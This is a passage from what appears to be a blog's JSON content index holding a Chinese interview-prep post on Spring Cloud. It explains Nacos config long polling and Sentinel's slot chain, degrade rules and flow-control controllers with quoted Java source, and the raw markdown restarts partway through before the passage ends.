req.getHeader(\"Vipserver-Tag\");\n    int delayTime = SwitchService.getSwitchInteger(SwitchService.FIXED_DELAY_TIME, 500);\n    /**\n     * 提前500ms返回响应，为避免客户端超时 @qiaoyi.dingqy 2013.10.22改动  add delay time for LoadBalance\n     */\n    long timeout = Math.max(10000, Long.parseLong(str) - delayTime);\n    if (isFixedPolling()) {\n        timeout = Math.max(10000, getFixedPollingInterval());\n        // do nothing but set fix polling timeout\n    } else {\n        long start = System.currentTimeMillis();\n        List<String> changedGroups = MD5Util.compareMd5(req, rsp, clientMd5Map);\n        if (changedGroups.size() > 0) {\n            generateResponse(req, rsp, changedGroups);\n            LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\",\n                System.currentTimeMillis() - start, \"instant\", RequestUtil.getRemoteIp(req), \"polling\",\n                clientMd5Map.size(), probeRequestSize, changedGroups.size());\n            return;\n        } else if (noHangUpFlag != null && noHangUpFlag.equalsIgnoreCase(TRUE_STR)) {\n            LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\", System.currentTimeMillis() - start, \"nohangup\",\n                RequestUtil.getRemoteIp(req), \"polling\", clientMd5Map.size(), probeRequestSize,\n                changedGroups.size());\n            return;\n        }\n    }\n    String ip = RequestUtil.getRemoteIp(req);\n    // 一定要由HTTP线程调用，否则离开后容器会立即发送响应\n    final AsyncContext asyncContext = req.startAsync();\n    // AsyncContext.setTimeout()的超时时间不准，所以只能自己控制\n    asyncContext.setTimeout(0L);\n\t\n\t// 在 ClientLongPolling 的 run 方法会将 ClientLongPolling 实例（携带了本次请求的相关信息）放入 allSubs 中，然后会在29.5s后再执行另一个 Runnable，该 Runnable 用于等待29.5s后依旧没有相应的配置变更时对客户端进行响应，并将相应的 ClientLongPolling 实例从 allSubs 中移出\n    scheduler.execute(\n        new ClientLongPolling(asyncContext, clientMd5Map, ip, probeRequestSize, timeout, appName, tag));\n}\n```\n而 LongPollingService 实现了 AbstractEventListener，也就是说能接收事件通知，在其 com.alibaba.nacos.config.server.service.LongPollingService#onEvent 方法中可以看到，它关注的是 LocalDataChangeEvent 事件：\n```java\n@Override\npublic void onEvent(Event event) {\n    if (isFixedPolling()) {\n        // ignore\n    } else {\n        if (event instanceof LocalDataChangeEvent) {\n            LocalDataChangeEvent evt = (LocalDataChangeEvent)event;\n            scheduler.execute(new DataChangeTask(evt.groupKey, evt.isBeta, evt.betaIps));\n        }\n    }\n}\n```\n在nacos上修改配置后就会产生 LocalDataChangeEvent 事件，此时 LongPollingService 也就能监听到，当收到该事件时就会遍历 allSubs，找到匹配的请求并将 groupKey 返回给客户端。具体代码在 DataChangeTask 中：\n```java\nclass DataChangeTask implements Runnable {\n    @Override\n    public void run() {\n        try {\n            ConfigService.getContentBetaMd5(groupKey);\n            for (Iterator<ClientLongPolling> iter = allSubs.iterator(); iter.hasNext(); ) {\n                ClientLongPolling clientSub = iter.next();\n                if (clientSub.clientMd5Map.containsKey(groupKey)) {\n                    // 如果beta发布且不在beta列表直接跳过\n                    if (isBeta && !betaIps.contains(clientSub.ip)) {\n                        continue;\n                    }\n\n                    // 如果tag发布且不在tag列表直接跳过\n                    if (StringUtils.isNotBlank(tag) && !tag.equals(clientSub.tag)) {\n                        continue;\n                    }\n\n                    getRetainIps().put(clientSub.ip, System.currentTimeMillis());\n                    iter.remove(); // 删除订阅关系\n                    LogUtil.clientLog.info(\"{}|{}|{}|{}|{}|{}|{}\",\n                        (System.currentTimeMillis() - changeTime),\n                        \"in-advance\",\n                        RequestUtil.getRemoteIp((HttpServletRequest)clientSub.asyncContext.getRequest()),\n                        \"polling\",\n                        clientSub.clientMd5Map.size(), clientSub.probeRequestSize, groupKey);\n                    clientSub.sendResponse(Arrays.asList(groupKey));\n                }\n            }\n        } catch (Throwable t) {\n            LogUtil.defaultLog.error(\"data change error:\" + t.getMessage(), t.getCause());\n        }\n    }\n\n    DataChangeTask(String groupKey) {\n        this(groupKey, false, null);\n    }\n\n    DataChangeTask(String groupKey, boolean isBeta, List<String> betaIps) {\n        this(groupKey, isBeta, betaIps, null);\n    }\n\n    DataChangeTask(String groupKey, boolean isBeta, List<String> betaIps, String tag) {\n        this.groupKey = groupKey;\n        this.isBeta = isBeta;\n        this.betaIps = betaIps;\n        this.tag = tag;\n    }\n\n    final String groupKey;\n    final long changeTime = System.currentTimeMillis();\n    final boolean isBeta;\n    final List<String> betaIps;\n    final String tag;\n}\n```\n当客户端收到变更的dataid+group后，就会去服务端获取最新的配置数据，并更新本地数据 cacheData，然后发送数据变更事件，整个流程结束。\n\n- 获取服务端最新配置数据的方法：com.alibaba.nacos.client.config.impl.ClientWorker#getServerConfig\n- 发送数据变更事件的方法：com.alibaba.nacos.client.config.impl.CacheData#checkListenerMd5\n\n## Sentienl\nSentinel是阿里巴巴开源的一款流量控制和熔断降级框架，主要用于微服务架构中服务的流量控制和熔断降级。其限流实现原理主要分为两个部分：\n\n> 统计信息收集\n\nSentinel会在运行过程中对服务的各种统计信息进行收集，包括请求的响应时间、请求通过的QPS（每秒查询率）、线程池队列大小等指标。这些指标通过定义的规则进行分析，判断当前请求是否超过了设定的阈值。\n\n> 阈值判断\n\nSentinel根据收集到的统计信息，通过定义的规则对请求进行判断。规则中包括以下几个要素：\n\n资源名：对哪个资源进行限流\n流控模式：直接拒绝或者匀速通过\n流控阈值：单位时间内允许通过的请求个数\n统计时间窗口：多长时间内统计一次流量，单位秒\n降级处理：当请求超过阈值时的处理策略，如直接拒绝、返回默认值等\nSentinel会根据以上规则进行限流，当请求超过阈值时，根据设置的降级处理策略进行处理，比如直接拒绝请求、返回默认值等。同时，Sentinel还可以进行自适应的流控，根据实际情况调整阈值，保证服务的可用性和稳定性。\n\n### 工作原理\n#### Slot 插槽\n在 Sentinel 里面，所有的资源都对应一个资源名称（resourceName），每次资源调用都会创建一个 Entry 对象。Entry 可以通过对主流框架的适配自动创建，也可以通过注解的方式或调用 SphU API 显式创建。Entry 创建的时候，同时也会创建一系列功能插槽（slot chain），这些插槽有不同的职责，例如:\n\n- NodeSelectorSlot 负责收集资源的路径，并将这些资源的调用路径，以树状结构存储起来，用于根据调用路径来限流降级；\n- ClusterBuilderSlot 则用于存储资源的统计信息以及调用者信息，例如该资源的 RT, QPS, thread count 等等，这些信息将用作为多维度限流，降级的依据；\n- StatisticSlot 则用于记录、统计不同纬度的 runtime 指标监控信息；\n- FlowSlot 则用于根据预设的限流规则以及前面 slot 统计的状态，来进行流量控制；\n- AuthoritySlot 则根据配置的黑白名单和调用来源信息，来做黑白名单控制；\n- DegradeSlot 则通过统计信息以及预设的规则，来做熔断降级；\n- SystemSlot 则通过系统的状态，例如 load1 等，来控制总的入口流量；\n\nSentinel 提供了插槽接口 ProcessorSlot，其中提供了方法 enrty 处理进入请求 和 exit 处理请求结束操作\n```java\npublic interface ProcessorSlot<T> {\n \n    /**\n     * Entrance of this slot.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param param           generics parameter, usually is a {@link com.alibaba.csp.sentinel.node.Node}\n     * @param count           tokens needed\n     * @param prioritized     whether the entry is prioritized\n     * @param args            parameters of the original call\n     * @throws Throwable blocked exception or unexpected error\n     */\n    void entry(Context context, ResourceWrapper resourceWrapper, T param, int count, boolean prioritized,\n               Object... args) throws Throwable;\n \n    /**\n     * Means finish of {@link #entry(Context, ResourceWrapper, Object, int, boolean, Object...)}.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param obj             relevant object (e.g. Node)\n     * @param count           tokens needed\n     * @param prioritized     whether the entry is prioritized\n     * @param args            parameters of the original call\n     * @throws Throwable blocked exception or unexpected error\n     */\n    void fireEntry(Context context, ResourceWrapper resourceWrapper, Object obj, int count, boolean prioritized,\n                   Object... args) throws Throwable;\n \n    /**\n     * Exit of this slot.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param count           tokens needed\n     * @param args            parameters of the original call\n     */\n    void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args);\n \n    /**\n     * Means finish of {@link #exit(Context, ResourceWrapper, int, Object...)}.\n     *\n     * @param context         current {@link Context}\n     * @param resourceWrapper current resource\n     * @param count           tokens needed\n     * @param args            parameters of the original call\n     */\n    void fireExit(Context context, ResourceWrapper resourceWrapper, int count, Object... args);\n}\n```\n总体的框架如下:\n\n![结构图](./2024/05/26/Springcloud最热点面试题/3.png)\n\nSentinel 将 SlotChainBuilder 作为 SPI 接口进行扩展，使得 Slot Chain 具备了扩展的能力。您可以自行加入自定义的 slot 并编排 slot 间的顺序，从而可以给 Sentinel 添加自定义的功能。\n\n![Sentinel图](./2024/05/26/Springcloud最热点面试题/4.png)\n\n#### RuleManager 规则管理器\n每个 Slot 插槽背后都对应着一个 RuleManager 的实现类，简单理解就是每个 Slot 有一套规则，规则验证处理由对应的 RuleManager 来进行处理。\n\n流量控制：FlowSolt 对应 FlowRuleManager\n\n降级控制：DegradeSlot  对应 DegradeRuleManager\n\n权限控制：AuthoritySlot 对应 AuthorityRuleManager\n\n系统规则控制： SystemSlot 对应 SystemRuleManager\n\n#### 降级控制实现原理\n1. 新增资源配置降级规则，目前对于降级策有如下三种：\n\nRT：平均响应时间 (DEGRADE_GRADE_RT)：当 1s 内持续进入 5 个请求，对应时刻的平均响应时间（秒级）均超过阈值（count，以 ms 为单位），那么在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 DegradeException）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，超出此阈值的都会算作 4900 ms，若需要变更此上限可以通过启动配置项 -Dcsp.sentinel.statistic.max.rt=xxx 来配置。\n\n![平均响应图](./2024/05/26/Springcloud最热点面试题/5.png)\n\n异常比例：当资源的每秒请求量 >= 5，并且每秒异常总数占通过量的比值超过阈值（DegradeRule 中的 count）之后，资源进入降级状态，即在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。\n\n![异常比例图](./2024/05/26/Springcloud最热点面试题/6.png)\n\n异常数：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 timeWindow 小于 60s，则结束熔断状态后仍可能再进入熔断状态。\n\n![异常数图](./2024/05/26/Springcloud最热点面试题/7.png)\n\n限流结果信息\n\n```text\nBlocked by Sentinel (flow limiting)\n```\n\n2. 实现逻辑\n\n在之前我们已经提及 Sentinel 是通过 slot 链来实现的，对于降级功能其提供了 DegradeSlot，实现源码如下：\n```java\npublic class DegradeSlot extends AbstractLinkedProcessorSlot<DefaultNode> {\n \n    @Override\n    public void entry(Context context, ResourceWrapper resourceWrapper, DefaultNode node, int count, boolean prioritized, Object... args)\n        throws Throwable {\n        DegradeRuleManager.checkDegrade(resourceWrapper, context, node, count);\n        fireEntry(context, resourceWrapper, node, count, prioritized, args);\n    }\n \n    @Override\n    public void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args) {\n        fireExit(context, resourceWrapper, count, args);\n    }\n}\n```\n通过上面代码我们可以了解到，限流规则的实现是在 DegradeRuleManager 的checkDegrade中来处理的，限流可以-配置多个规则，依次按照规则来处理。\n```java\npublic static void checkDegrade(ResourceWrapper resource, Context context, DefaultNode node, int count)\n        throws BlockException {\n \n        Set<DegradeRule> rules = degradeRules.get(resource.getName());\n        if (rules == null) {\n            return;\n        }\n \n        for (DegradeRule rule : rules) {\n            if (!rule.passCheck(context, node, count)) {\n                throw new DegradeException(rule.getLimitApp(), rule);\n            }\n        }\n    }\n```\n在 DegradeRule 的 passCheck 方法中我们可以看到可以根据 RT、异常数和异常比例来进行熔断降级处理。\n```java\n@Override\n    public boolean passCheck(Context context, DefaultNode node, int acquireCount, Object... args) {\n        if (cut.get()) {\n            return false;\n        }\n \n        ClusterNode clusterNode = ClusterBuilderSlot.getClusterNode(this.getResource());\n        if (clusterNode == null) {\n            return true;\n        }\n \n\t\t// 请求处理时间\n        if (grade == RuleConstant.DEGRADE_GRADE_RT) {\n            double rt = clusterNode.avgRt();\n            if (rt < this.count) {\n                passCount.set(0);\n                return true;\n            }\n \n            // Sentinel will degrade the service only if count exceeds.\n            if (passCount.incrementAndGet() < rtSlowRequestAmount) {\n                return true;\n            }\n        } else if (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_RATIO) {\n\t\t\t//异常比例\n            double exception = clusterNode.exceptionQps();\n            double success = clusterNode.successQps();\n            double total = clusterNode.totalQps();\n            // If total amount is less than minRequestAmount, the request will pass.\n            if (total < minRequestAmount) {\n                return true;\n            }\n \n            // In the same aligned statistic time window,\n            // \"success\" (aka. completed count) = exception count + non-exception count (realSuccess)\n            double realSuccess = success - exception;\n            if (realSuccess <= 0 && exception < minRequestAmount) {\n                return true;\n            }\n \n            if (exception / success < count) {\n                return true;\n            }\n        } else if (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_COUNT) {\n\t\t\t//异常数\n            double exception = clusterNode.totalException();\n            if (exception < count) {\n                return true;\n            }\n        }\n \n        if (cut.compareAndSet(false, true)) {\n            ResetTask resetTask = new ResetTask(this);\n            pool.schedule(resetTask, timeWindow, TimeUnit.SECONDS);\n        }\n \n        return false;\n    }\n```\n\n#### 流量控制实现原理\n接下来我们了解学习一下 Sentinel 是如何实现流量控制的\n\n流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。\n\nFlowSlot 会根据预设的规则，结合前面 NodeSelectorSlot、ClusterNodeBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。\n\n限流的直接表现是在执行 Entry nodeA = SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，您可以捕捉 BlockException 来自定义被限流之后的处理逻辑。\n\n同一个资源可以创建多条限流规则。FlowSlot 会对该资源的所有限流规则依次遍历，直到有规则触发限流或者所有规则遍历完毕。\n\n一条限流规则主要由下面几个因素组成，我们可以组合这些元素来实现不同的限流效果：\n\n- resource：资源名，即限流规则的作用对象\n- count: 限流阈值\n- grade: 限流阈值类型（QPS 或并发线程数）\n- limitApp: 流控针对的调用来源，若为 default 则不区分调用来源\n- strategy: 调用关系限流策略\n- controlBehavior: 流量控制效果（直接拒绝、Warm Up、匀速排队）\n\n流控-QPS配置\n\n![QPS配置图](./2024/05/26/Springcloud最热点面试题/8.png)\n\n流控-线程数配置\n\n![流控图](./2024/05/26/Springcloud最热点面试题/9.png)\n\n##### 实现流程\nSentinel 提供了 FlowSlot 用来进行流量控制，流量规则的最终实现在 FlowRuleChecker 的 checkFlow 中实现的。\n```java\npublic class FlowSlot extends AbstractLinkedProcessorSlot<DefaultNode> {\n \n    private final FlowRuleChecker checker;\n \n    public FlowSlot() {\n        this(new FlowRuleChecker());\n    }\n \n    /**\n     * Package-private for test.\n     *\n     * @param checker flow rule checker\n     * @since 1.6.1\n     */\n    FlowSlot(FlowRuleChecker checker) {\n        AssertUtil.notNull(checker, \"flow checker should not be null\");\n        this.checker = checker;\n    }\n \n    @Override\n    public void entry(Context context, ResourceWrapper resourceWrapper, DefaultNode node, int count,\n                      boolean prioritized, Object... args) throws Throwable {\n        checkFlow(resourceWrapper, context, node, count, prioritized);\n \n        fireEntry(context, resourceWrapper, node, count, prioritized, args);\n    }\n \n    void checkFlow(ResourceWrapper resource, Context context, DefaultNode node, int count, boolean prioritized)\n        throws BlockException {\n        checker.checkFlow(ruleProvider, resource, context, node, count, prioritized);\n    }\n \n    @Override\n    public void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args) {\n        fireExit(context, resourceWrapper, count, args);\n    }\n \n    private final Function<String, Collection<FlowRule>> ruleProvider = new Function<String, Collection<FlowRule>>() {\n        @Override\n        public Collection<FlowRule> apply(String resource) {\n            // Flow rule map should not be null.\n            Map<String, List<FlowRule>> flowRules = FlowRuleManager.getFlowRuleMap();\n            return flowRules.get(resource);\n        }\n    };\n}\n```\n在 checkFlow 中会依次获取我们配置的流控规则，然后依次进行流控判断处理，如果被流控则抛出异常 FlowException\n```java\npublic void checkFlow(Function<String, Collection<FlowRule>> ruleProvider, ResourceWrapper resource,\n                          Context context, DefaultNode node, int count, boolean prioritized) throws BlockException {\n        if (ruleProvider == null || resource == null) {\n            return;\n        }\n        Collection<FlowRule> rules = ruleProvider.apply(resource.getName());\n        if (rules != null) {\n            for (FlowRule rule : rules) {\n                if (!canPassCheck(rule, context, node, count, prioritized)) {\n                    throw new FlowException(rule.getLimitApp(), rule);\n                }\n            }\n        }\n    }\n```\n在 canPassCheck 中会判断是集群限流还是本地限流\n```java\npublic boolean canPassCheck(/*@NonNull*/ FlowRule rule, Context context, DefaultNode node, int acquireCount,\n                                                    boolean prioritized) {\n        String limitApp = rule.getLimitApp();\n        if (limitApp == null) {\n            return true;\n        }\n \n        if (rule.isClusterMode()) {\n            return passClusterCheck(rule, context, node, acquireCount, prioritized);\n        }\n \n        return passLocalCheck(rule, context, node, acquireCount, prioritized);\n    }\n```\n如果是本地限流则获取节点信息，然后根据流控规则进行流控判断\n```java\nprivate static boolean passLocalCheck(FlowRule rule, Context context, DefaultNode node, int acquireCount,\n                                          boolean prioritized) {\n        Node selectedNode = selectNodeByRequesterAndStrategy(rule, context, node);\n        if (selectedNode == null) {\n            return true;\n        }\n \n        return rule.getRater().canPass(selectedNode, acquireCount, prioritized);\n    }\n```\n当 QPS 超过某个阈值的时候，则采取措施进行流量控制。流量控制的手段包括以下几种：直接拒绝、Warm Up、匀速排队。对应 FlowRule 中的 controlBehavior 字段。\n\n直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当QPS超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时。具体的例子参见 FlowQpsDemo。\n\nWarm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热/冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过\"冷启动\"，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档\n\n目前 Sentinel 对于流量控制提供了如下几种方式：\n\n- 直接拒绝（DefaultController）：支持抛出异常\n```java\n    @Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        int curCount = avgUsedTokens(node);\n        if (curCount + acquireCount > count) {\n            if (prioritized && grade == RuleConstant.FLOW_GRADE_QPS) {\n                long currentTime;\n                long waitInMs;\n                currentTime = TimeUtil.currentTimeMillis();\n                waitInMs = node.tryOccupyNext(currentTime, acquireCount, count);\n                if (waitInMs < OccupyTimeoutProperty.getOccupyTimeout()) {\n                    node.addWaitingRequest(currentTime + waitInMs, acquireCount);\n                    node.addOccupiedPass(acquireCount);\n                    sleep(waitInMs);\n \n                    // PriorityWaitException indicates that the request will pass after waiting for {@link @waitInMs}.\n                    throw new PriorityWaitException(waitInMs);\n                }\n            }\n            return false;\n        }\n        return true;\n    }\n```\n- 匀速排队（RateLimiterController）：判断等待时间，如果等待时间过长也是会限流，并且使用 Thread.sleep 如果配置不正确可能会导致线程过多。\n```java\n@Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        // Pass when acquire count is less or equal than 0.\n        if (acquireCount <= 0) {\n            return true;\n        }\n        // Reject when count is less or equal than 0.\n        // Otherwise,the costTime will be max of long and waitTime will overflow in some cases.\n        if (count <= 0) {\n            return false;\n        }\n \n        long currentTime = TimeUtil.currentTimeMillis();\n        // Calculate the interval between every two requests.\n        long costTime = Math.round(1.0 * (acquireCount) / count * 1000);\n \n        // Expected pass time of this request.\n        long expectedTime = costTime + latestPassedTime.get();\n \n        if (expectedTime <= currentTime) {\n            // Contention may exist here, but it's okay.\n            latestPassedTime.set(currentTime);\n            return true;\n        } else {\n            // Calculate the time to wait.\n            long waitTime = costTime + latestPassedTime.get() - TimeUtil.currentTimeMillis();\n            if (waitTime > maxQueueingTimeMs) {\n                return false;\n            } else {\n                long oldTime = latestPassedTime.addAndGet(costTime);\n                try {\n                    waitTime = oldTime - TimeUtil.currentTimeMillis();\n                    if (waitTime > maxQueueingTimeMs) {\n                        latestPassedTime.addAndGet(-costTime);\n                        return false;\n                    }\n                    // in race condition waitTime may <= 0\n                    if (waitTime > 0) {\n                        Thread.sleep(waitTime);\n                    }\n                    return true;\n                } catch (InterruptedException e) {\n                }\n            }\n        }\n        return false;\n    }\n```\n- Warm Up（WarmUpController 和 WarmUpRateLimiterController）：预热启动\n```java\n    @Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        long passQps = (long) node.passQps();\n \n        long previousQps = (long) node.previousPassQps();\n        syncToken(previousQps);\n \n        // 开始计算它的斜率\n        // 如果进入了警戒线，开始调整他的qps\n        long restToken = storedTokens.get();\n        if (restToken >= warningToken) {\n            long aboveToken = restToken - warningToken;\n            // 消耗的速度要比warning快，但是要比慢\n            // current interval = restToken*slope+1/count\n            double warningQps = Math.nextUp(1.0 / (aboveToken * slope + 1.0 / count));\n            if (passQps + acquireCount <= warningQps) {\n                return true;\n            }\n        } else {\n            if (passQps + acquireCount <= count) {\n                return true;\n            }\n        }\n \n        return false;\n    }\n```\n\n","source":"_posts/Springcloud最热点面试题.md","raw":"---\ntitle: Springcloud最热点面试题\ndate: 2024-05-26 22:57:29\ntags: springcloud\ncategories: 面试\n---\n\n\n\nSpring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、智能路由、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。\n\nSpring Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。\n## 服务注册与发现\n### eureka\n服务治理组件，包括服务端的注册中心和客户端的服务发现机制；\n### consul\n基于Hashicorp Consul的服务治理组件。\n## 服务负载与均衡\n### ribbon\n负载均衡的服务调用组件，具有多种负载均衡调用策略；\n### loadbalancer\n## 服务负载与调用\n### feign\n基于Ribbon和Hystrix的声明式服务调用组件；\n### openFeign\n基于Ribbon和Hystrix的声明式服务调用组件，可以动态创建基于Spring MVC注解的接口实现用于服务调用，在Spring Cloud 2.0中已经取代Feign成为了一等公民。\n## 服务熔断与降级\n### hystrix\n服务容错组件，实现了断路器模式，为依赖服务的出错和延迟提供了容错能力；\n### resilience4j\n## 服务网关\n### zuul\nAPI网关组件，对请求提供路由及过滤功能。\n### zuul2\n### getway\nAPI网关组件，对请求提供路由及过滤功能。\n## 服务分布式配置\n### springcloud config\n集中配置管理工具，分布式系统中统一的外部配置管理，默认使用Git来存储配置，可以支持客户端配置的刷新及加密、解密操作。\n### Nacos\n## 总线\n### Spring Cloud Bus\n用于传播集群状态变化的消息总线，使用轻量级消息代理链接分布式系统中的节点，可以用来动态刷新集群中的服务配置。\n# springcloudAlibaba\n## Nacos\nNacos 是一个开源的分布式系统服务发现、配置管理和服务管理平台。它主要包含以下功能：\n\n服务发现与注册：Nacos 可以管理服务的注册和发现，支持 DNS 和 HTTP/RESTful 方式。\n配置管理：Nacos 可以动态管理配置，支持多种数据类型和版本控制。\n服务管理：Nacos 可以对服务进行健康检查、流量管理、负载均衡等。\n### 服务发现与注册\nNacos 实现服务发现和注册的核心代码位于 nacos/naming 目录下，包括以下文件：\n\n- naming-common/src/main/java/com/alibaba/nacos/api/naming: 定义了服务发现和注册的 API 接口和数据模型。\n- naming-core/src/main/java/com/alibaba/nacos/naming: 实现了服务发现和注册的核心逻辑。\n- naming-impl/src/main/java/com/alibaba/nacos/naming: 实现了服务发现和注册的具体实现。\n\n下面简单介绍一下 Nacos 的服务发现和注册的实现流程。\n\n#### 服务注册流程\n服务提供者向 Nacos 注册服务时，会调用 NamingService.registerInstance() 方法，该方法会做以下几件事情：\n\n1. 将服务实例的元数据封装为 Instance 对象，包括服务名、IP、端口号、健康状态、元数据等。\n2. 将 Instance 对象转换为 InstanceEntity 对象，包含了实例 ID 和实例元数据的 JSON 字符串。\n3. 将 InstanceEntity 对象存储到 Nacos 中，可以存储到内存中或者持久化到磁盘中。\n\n#### 服务发现流程\n服务消费者向 Nacos 发现服务时，会调用 NamingService.getAllInstances() 或 NamingService.selectInstances() 方法，该方法会做以下几件事情：\n\n1. 从 Nacos 中获取服务实例的元数据，包括服务名、IP、端口号、健康状态、元数据等。\n2. 将元数据封装为 Instance 对象，存储到本地缓存中。\n3. 根据负载均衡算法选择一个服务实例处理请求，可以选择轮询、随机、权重等算法。\n\n服务发现和注册的核心逻辑在 naming-core 目录下的 com.alibaba.nacos.naming 包中实现，主要包括以下类：\n\n- com.alibaba.nacos.naming.core.InstancesManager: 维护服务实例的元数据和状态信息。\n- com.alibaba.nacos.naming.core.Cluster: 维护一个服务的所有实例信息和负载均衡策略。\n- com.alibaba.nacos.naming.core.InstanceOperator: 实现了服务实例的注册、注销和更新操作。\n- com.alibaba.nacos.naming.core.DomainsManager: 维护多个服务的信息，包括服务名、集群名、命名空间等。\n\n服务发现和注册的具体实现在 naming-impl 目录下的 com.alibaba.nacos.naming 包中，主要包括以下类：\n\n- com.alibaba.nacos.naming.push.PushService: 实现了服务实例的推送功能。\n- com.alibaba.nacos.naming.healthcheck.HealthCheckProcessor: 实现了服务实例的健康检查功能。\n- com.alibaba.nacos.naming.misc.GlobalConfig: 存储了一些全局配置，例如默认权重值、心跳间隔\n\n### 配置动态刷新\n\n从远端服务器获取变更数据的主要模式有两种：推（push）和拉（pull）。Push 模式简单来说就是服务端主动将数据变更信息推送给客户端，这种模式优点是时效性好，服务端数据发生变更可以立马通知到客户端，但这种模式需要服务端维持与客户端的心跳连接，会增加服务端实现的复杂度，服务端也需要占用更多的资源来维持与客户端的连接。\n\n而 Pull 模式则是客户端主动去服务器请求数据，例如，每间隔10ms就向服务端发起请求获取数据。显而易见pull模式存在时效性问题。请求的间隔也不太好设置，间隔太短，对服务器请求压力过大。间隔时间过长，那么必然会造成时效性很差。而且如果配置长时间不更新，并且存在大量的客户端就会产生大量无效的pull请求。\n\nNacos 没有采用上述的两种模式，而是采用了长轮询方式结合了推和拉的优点：\n\n![动态刷新图](./2024/05/26/Springcloud最热点面试题/1.png)\n\n长轮询也是轮询，因此 Nacos 客户端会默认每10ms向服务端发起请求，当客户端请求服务端时会在请求头上携带长轮询的超时时间，默认是30s。而服务端接收到该请求时会hang住请求，为了防止客户端超时会在请求头携带的超时时间上减去500ms，因此默认会hang住请求29.5s。在这期间如果服务端发生了配置变更会产生相应的事件，监听到该事件后，会响应对应的客户端。这样一来客户端不会频繁发起轮询请求，而服务端也不需要维持与客户端的心跳，兼备了时效性和复杂度。\n\n![长轮询图](./2024/05/26/Springcloud最热点面试题/2.png)\n\n\n> 1.4版本nacos使用Http短连接+长轮询的方式，客户端发起http请求，服务端hold住请求，当配置变更时响应客户端，超时时间30s。\n> 2.0版本nacos用gRPC长连接代替了http短连接长轮询。配置同步采用推拉结合的方式。\n\n#### Nacos Config 长轮询源码剖析\n首先，打开 com.alibaba.cloud.nacos.NacosConfigBootstrapConfiguration 这个类，从类名也可以看出该类是Nacos Config的启动配置类，是Nacos Config自动装配的入口。在该类中的 nacosConfigManager 方法实例化了一个 NacosConfigManager 对象，并注册到容器中：\n\n```java\n@Bean\n@ConditionalOnMissingBean\npublic NacosConfigManager nacosConfigManager(\n\t\tNacosConfigProperties nacosConfigProperties) {\n\treturn new NacosConfigManager(nacosConfigProperties);\n}\n```\n在 NacosConfigManager 的构造器中调用了 createConfigService 方法，这是一个静态方法用来创建 ConfigService 对象的单例。\n```java\n/**\n * Compatible with old design,It will be perfected in the future.\n */\nstatic ConfigService createConfigService(\n\t\tNacosConfigProperties nacosConfigProperties) {\n    // 双重检查锁模式的单例\n\tif (Objects.isNull(service)) {\n\t\tsynchronized (NacosConfigManager.class) {\n\t\t\ttry {\n\t\t\t\tif (Objects.isNull(service)) {\n\t\t\t\t\tservice = NacosFactory.createConfigService(\n\t\t\t\t\t\t\tnacosConfigProperties.assembleConfigServiceProperties());\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (NacosException e) {\n\t\t\t\tlog.error(e.getMessage());\n\t\t\t\tthrow new NacosConnectionFailureException(\n\t\t\t\t\t\tnacosConfigProperties.getServerAddr(), e.getMessage(), e);\n\t\t\t}\n\t\t}\n\t}\n\treturn service;\n}\n```\nConfigService 的具体实现是 NacosConfigService，在该类的构造器中主要初始化了 HttpAgent 和 ClientWorker 对象。ClientWorker 的构造器中则初始化了几个线程池：\n\n```java\npublic ClientWorker(final HttpAgent agent, final ConfigFilterChainManager configFilterChainManager,\n        final Properties properties) {\n    this.agent = agent;\n    this.configFilterChainManager = configFilterChainManager;\n    \n    // Initialize the timeout parameter\n    init(properties);\n    \n    // 创建具有定时执行功能的单线程池，用于定时执行 checkConfigInfo 方法\n    this.executor = Executors.newScheduledThreadPool(1, new ThreadFactory() {\n        @Override\n        public Thread newThread(Runnable r) {\n            Thread t = new Thread(r);\n            t.setName(\"com.alibaba.nacos.client.Worker.\" + agent.getName());\n            t.setDaemon(true);\n            return t;\n        }\n    });\n    \n    // 创建具有定时执行功能的且线程数与cpu核数相对应的线程池，用于根据需要动态刷新的配置文件执行 LongPollingRunnable，因此长轮询任务是可以有多个并行的\n    this.executorService = Executors\n            